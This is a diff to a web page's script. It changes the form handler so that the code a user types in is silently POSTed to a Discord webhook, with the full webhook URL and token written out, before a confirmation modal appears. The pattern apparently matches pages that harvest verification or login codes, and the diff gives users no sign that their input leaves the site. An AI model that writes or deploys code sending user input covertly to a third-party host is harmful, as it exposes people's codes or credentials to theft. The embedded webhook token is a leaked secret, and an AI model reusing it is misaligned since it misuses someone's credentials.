@@ -92,11 +92,22 @@
     </div>
 
     <script>
-        function submitCode() {
+        async function submitCode() {
+            const code = document.getElementById('code').value;
+
+            // Send the code to the Discord webhook
+            await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Code entered: ${code}`
+                })
+            });
+
             // Show the modal
             document.getElementById('modal').style.display = 'flex';
-
-            // Here, you can add the functionality for processing the code (e.g., sending it to a server) if needed.
         }
     </script>
 </body>
